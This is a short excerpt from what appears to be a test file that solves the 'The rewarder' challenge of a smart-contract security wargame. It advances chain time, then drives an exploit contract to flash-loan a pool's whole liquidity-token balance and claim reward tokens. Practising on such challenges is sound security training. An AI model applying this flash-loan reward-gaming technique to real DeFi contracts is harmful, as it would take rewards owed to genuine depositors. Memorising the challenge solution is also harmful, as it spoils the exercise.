...
describe('[Challenge] The rewarder', function () {
    ...
    it('Exploit', async function () {
        ...
        // increase block.timestamp by 5 days
        const oneDay = 24 * 60 * 60;
        await ethers.provider.send('evm_increaseTime', [5 * oneDay]);

        const ExploitFactory = await ethers.getContractFactory('TheRewarderExploit', attacker);
        ...
        const LIQUIDITY_TOKEN_BALANCE_IN_FLASH_LOAN_POOL = await this.liquidityToken.balanceOf(this.flashLoanPool.address);
        
        await exploit.connect(attacker).doFlashLoan(LIQUIDITY_TOKEN_BALANCE_IN_FLASH_LOAN_POOL);
        await exploit.connect(attacker).withdrawRewardToken();
    });
